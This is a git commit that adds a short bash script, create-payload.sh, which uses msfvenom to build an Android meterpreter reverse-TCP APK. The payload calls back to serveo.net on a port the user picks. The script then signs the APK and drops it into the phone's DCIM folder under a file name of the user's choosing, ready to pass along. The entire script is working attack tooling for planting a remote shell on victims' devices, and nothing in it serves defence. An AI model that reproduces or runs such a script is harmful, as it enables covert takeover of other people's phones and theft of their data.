9b56b6f448403be4498a7f4e79081511dac9d2b5
anxanujz <112464718+anxanujz@users.noreply.github.com>
2022-08-31 06:13:46 +0530

    Create create-payload.sh

---
+++ create-payload.sh
@@ -0,0 +1,9 @@
+# !bin/bash
+# Author : Anuj
+
+read -p 'Enter port for serveo: ' port
+read -p 'Enter output filename: ' output
+msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R > Newtest.apk
+apksigner autokey Newtest.apk Testing.apk
+mv Testing.apk ~/storage/dcim/$output.apk
+rm Newtest.apk autokey
